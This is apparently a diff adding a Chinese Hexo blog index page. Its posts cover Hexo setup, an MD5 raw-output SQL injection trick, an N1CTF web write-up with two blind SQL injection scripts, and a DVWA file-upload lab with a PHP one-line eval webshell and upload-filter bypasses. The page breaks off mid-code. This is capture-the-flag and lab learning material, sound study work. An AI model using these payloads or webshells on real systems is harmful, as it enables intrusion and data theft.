@@ -1,0 +1,1354 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/page/4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="default">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+    
+    
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: true,
+          isPost: false,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Mr1.Grim</a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/categories/开发工具/">玩转开发工具</a></li>
+                        
+                            <li><a  href="/categories/digital">玩转数码</a></li>
+                        
+                            <li><a  href="/categories/algorithm">算法学习</a></li>
+                        
+                            <li><a  href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="/xxxxx" title="github">github</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.csdn.net/baidu_21483933">csdn</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://segmentfault.com/blog/maocg_web">segmentfault</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.jianshu.com/users/eb37ef89c746/latest_articles">简书</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱动漫,爱游戏,爱编程,爱运动,爱的太多了!</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Mr1.Grim</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Mr1.Grim</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/categories/开发工具/">玩转开发工具</a></li>
+                
+                    <li><a href="/categories/digital">玩转数码</a></li>
+                
+                    <li><a href="/categories/algorithm">算法学习</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="/xxxxx" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-hexo" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/hexo/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.554Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/hexo/">hexo的相关配置</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="hexo的相关配置"><a href="#hexo的相关配置" class="headerlink" title="hexo的相关配置"></a>hexo的相关配置</h3><h4 id="临时体验hexo"><a href="#临时体验hexo" class="headerlink" title="临时体验hexo"></a>临时体验hexo</h4><p>在命令行输入<br><br>hexo g <br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/9fe4afa0gw1falkiaws1xj208p045t9j.jpg" alt="image"></p>
+<p>然后输入<br><br>hexo s <br><br>然后会提示:<br><br>Hexo is running at <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a>. Press Ctrl+C to stop.<br><br>在浏览器中打开<a href="http://localhost:4000/，你将会看到你刚刚改动的一切操作" target="_blank" rel="noopener">http://localhost:4000/，你将会看到你刚刚改动的一切操作</a></p>
+<h4 id="将Hexo与github-page-联系起来"><a href="#将Hexo与github-page-联系起来" class="headerlink" title="将Hexo与github page 联系起来"></a>将Hexo与github page 联系起来</h4><h4 id="写博客、发布文章"><a href="#写博客、发布文章" class="headerlink" title="写博客、发布文章"></a>写博客、发布文章</h4><p>新建一篇博客，执行下面的命令：<br><br>hexo new post “article title” <br><br>运行生成、部署命令：<br><br>hexo g   // 生成 <br><br>hexo d   // 部署 <br><br>当然你也可以执行下面的命令，相当于上面两条命令的效果<br><br>hexo d -g //在部署前先生成<br><br>部署成功后访问 你的地址，<a href="https://yourName.github.io（这里输入我的地址：" target="_blank" rel="noopener">https://yourName.github.io（这里输入我的地址：</a> <a href="https://gdutxiao.github.io" target="_blank" rel="noopener">https://gdutxiao.github.io</a> ),将可以看到生成的文章。</p>
+<h3 id="如果想做属于自己的hexo博客，请参考这个链接"><a href="#如果想做属于自己的hexo博客，请参考这个链接" class="headerlink" title="如果想做属于自己的hexo博客，请参考这个链接"></a>如果想做属于自己的hexo博客，请参考这个链接</h3><p><a href="http://blog.csdn.net/gdutxiaoxu/article/details/53576018" target="_blank" rel="noopener">手把手教你用Hexo+Github 搭建属于自己的博客</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-md5之sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/md5之sql注入/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.554Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/md5之sql注入/">MD5加密下的SQL注入</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>今天刷题的时候看到了mysql的一条语句为: (涨新姿势了)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</span><br></pre></td></tr></table></figure>
+<p>百度后才知道是一种md5加密的sql注入</p>
+<h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><p>md5(string, raw)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">raw 可选，默认为false </span><br><span class="line"></span><br><span class="line">true:返回16字符2进制格式</span><br><span class="line"></span><br><span class="line">false:返回32字符16进制格式</span><br></pre></td></tr></table></figure>
+<h3 id="MD5加密后的SQL注入"><a href="#MD5加密后的SQL注入" class="headerlink" title="MD5加密后的SQL注入"></a>MD5加密后的SQL注入</h3><p>md5加密后组成查询语句的时候这个hex会被转成字符串，如果转换之后的字符串包含’or’<xxx>，就会和原查询语句一起组成</xxx></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select admin where password=&apos;&apos;or&apos;&lt;xxx&gt;&apos;&quot;</span><br></pre></td></tr></table></figure>
+<p>这样就存在sql注入漏洞了</p>
+<p>这里提供一个字符串:ffifdyop</p>
+<p>md5加密后为:276f722736c95d99e921722cf9ed621c</p>
+<p>再转成字符串： ‘or’6&lt;其他字符&gt;</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-n1ctf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/n1ctf/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.554Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/n1ctf/">N1CTF WEB</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="web签到题一-77777-1"><a href="#web签到题一-77777-1" class="headerlink" title="web签到题一 77777 1"></a>web签到题一 77777 1</h2><p>由于题目已经关闭了，这里用其他大佬的图片.<br><img src="http://p1vrkwaxt.bkt.clouddn.com/N1CTF%20%281%29.jpg" alt="image"></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/N1CTF%20%282%29.jpg" alt="image"></p>
+<p>看了大佬的wp学到构造payload:(因为waf的原因，采取十六进制绕过，0x25就是%)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=1111&amp;hi= where (password like 0x25)</span><br></pre></td></tr></table></figure></p>
+<p>在源代码就是<br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Update users set points =1111 where (password like 0x25)</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/N1CTF%20%283%29.jpg" alt="image"></p>
+<p>说明update语句执行成功.<br><br>下面放出大佬的盲注脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import urllib</span><br><span class="line">url = &quot;http://47.97.168.223/index.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">true_flag = &quot;&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    payload = flag</span><br><span class="line">    for j in &quot;0123456789&quot;+string.letters+&quot;!@#$^&amp;*()&#123;&#125;=+`~_&quot;:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;flag&quot;:&quot;233333&quot;,</span><br><span class="line">            &quot;hi&quot;:urllib.unquote(&quot; where (password like 0x%s25)&quot;%(payload+hex(ord(j))[2:]))</span><br><span class="line">        &#125;</span><br><span class="line">        r =requests.post(url=url,data=data)</span><br><span class="line">        if &apos;233333&apos; in r.content:</span><br><span class="line">            flag += hex(ord(j))[2:]</span><br><span class="line">            true_flag += j</span><br><span class="line">            print true_flag</span><br><span class="line">            data1 = &#123;</span><br><span class="line">                &quot;flag&quot;: &quot;1&quot;,</span><br><span class="line">                &quot;hi&quot;: &quot; where 1&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            s = requests.post(url=url,data=data1)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：N1CTF&#123;he3l3locat233&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web签到题二-77777-2"><a href="#web签到题二-77777-2" class="headerlink" title="web签到题二 77777 2"></a>web签到题二 77777 2</h2><p>这一题是上面一题的翻版，据说页面一样(当时忙忘记看了这题)<br><br>过滤了很多like和部分数字等等<br><br>构造运算绕过:(例)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1+(username &gt; &quot;a&quot;)</span><br></pre></td></tr></table></figure>
+<p>此时的username&gt;”a”为true<br><br>id= 1+true为2<br><br>上面是一个例子，同样updata也可以仿照这样的方法<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/N1CTF%20%285%29.jpg" alt="image"><br>附上大佬脚本(注意url编码问题)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">url = &quot;http://47.52.137.90:20000/index.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload = urllib.unquote(&quot;%%2b( pw &gt; &apos;%s&apos;)&quot;%(flag+chr(j)))</span><br><span class="line">        data = &#123;</span><br><span class="line">             &quot;flag&quot;:&quot;10&quot;,</span><br><span class="line">              &quot;hi&quot;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        if &quot;| 10&lt;br/&gt;&quot; in r.content:</span><br><span class="line">            tmp = urllib.unquote(&quot;%%2b( pw &gt; &apos;%s&apos;)&quot;%(flag+chr(j-1)))</span><br><span class="line">            tmp_data = &#123;</span><br><span class="line">                &quot;flag&quot;: &quot;10&quot;,</span><br><span class="line">                &quot;hi&quot;: tmp</span><br><span class="line">            &#125;</span><br><span class="line">            s = requests.post(url=url,data=tmp_data)</span><br><span class="line">            if &quot;| 11&lt;br/&gt;&quot; in s.content:</span><br><span class="line">                flag += chr(j-1)</span><br><span class="line">                print flag</span><br><span class="line">                break</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：N1CTF&#123;HAHAH777A7AHA77777AAAA&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-DVWA之File Upload" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/DVWA之File Upload/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.554Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/DVWA之File Upload/">DVWA之File Upload</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p>
+<p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。</p>
+<p>这里需要特别说明的是上传漏洞的利用经常会使用WebShell，而WebShell的植入远不止文件上传这一种方式。</p>
+<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>服务端核心代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; </span><br><span class="line">    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Can we move the file to the upload folder? </span><br><span class="line">    if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123; </span><br><span class="line">        // No </span><br><span class="line">        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Yes! </span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>basename(path,suffix) </p>
+<p>函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。<br><br>可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p>
+<p>文件上传漏洞的利用是有限制条件的，必须要满足三个条件<br></p>
+<ul>
+<li>能够成功上传木马文件</li>
+<li>上传文件必须能够被执行</li>
+<li>上传文件的路径必须可知</li>
+</ul>
+<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>现在尝试上传test.php，内容如下(一句话木马):<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">eval($_POST[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/N%7D%29D$PPC9ITMJ4B5IXU%5D%5BZJ.png" alt="image"><br>可以看到上传的路径，接下来尝试用菜刀连接<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/CUO1FG8$UTQM6%259E@TTH%7D3Q.png" alt="image"></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/VHEN%28T3%29%5D9FNKAXO5F1X%25ZA.png" alt="image"></p>
+<p>连接成功</p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>服务端核心代码:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; </span><br><span class="line">    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; </span><br><span class="line">    $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; </span><br><span class="line">    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; 100000 ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Can we move the file to the upload folder? </span><br><span class="line">        if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123; </span><br><span class="line">            // No </span><br><span class="line">            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Yes! </span><br><span class="line">            echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Invalid file </span><br><span class="line">        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。</p>
+<h3 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h3><p>一句话木马，所以文件大小不会有问题<br></p>
+<p>直接上传test.png然后菜刀显然是不行的，因为该服务器对png做出图片相关操作，不会把它当作php文件来执行</p>
+<p>要想让这个服务器解析为php，可以利用文件包含漏洞来获取webshell权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dvwa/vulnerabilities/fi/?page=http://localhost/dvwa/hackable/uploads/hello.png</span><br></pre></td></tr></table></figure>
+<p>不过我这里菜刀连不上去，不知道是什么原因，用另外一种方法burpsuite抓包修改文件类型<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/R%7DT63%5B%5B4XMK%7DI_U~ME340%25G.png" alt="image"></p>
+<p>这里Content-Type: image/png，最终(已经上传了)的filename是hello.png,所以利用文件类型为图形，修改filename为hello.php,发现上传成功，再利用相同方法可以菜刀连接</p>
+<h2 id="00截断上传绕过"><a href="#00截断上传绕过" class="headerlink" title="%00截断上传绕过"></a>%00截断上传绕过</h2><p>在php版本小于5.3.4的服务器中，当magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hello.php%00.png。</p>
+<h2 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h2><p>服务端核心代码<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; </span><br><span class="line">    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; </span><br><span class="line">    $uploaded_ext  = 